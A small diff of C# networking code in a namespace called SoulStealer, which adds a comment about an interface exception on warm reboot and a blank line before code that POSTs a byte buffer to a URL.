@@ -23,7 +23,7 @@ namespace SoulStealer
             NetworkChange.NetworkAvailabilityChanged += NetworkChange_NetworkAvailabilityChanged;
             NetworkChange.NetworkAddressChanged += NetworkChange_NetworkAddressChanged;
             try
-            {
+            {   //During a warm reboot, the interface is still active and therefore this throws.
                 mNetwork.UseThisNetworkInterface();
             }
             catch (System.IO.IOException ex){}
@@ -51,6 +51,7 @@ namespace SoulStealer
             byte[] copy = new byte[size+1];
             bytes.CopyTo(copy, 0);
             copy[size] = (byte)(comingin ? 1 : 0);
+
             var postContent = POSTContent.CreateBinaryBasedContent(copy);
             var request = HttpHelper.CreateHttpPostRequest(url, postContent, "application/octet-stream");
             request.SendRequest();
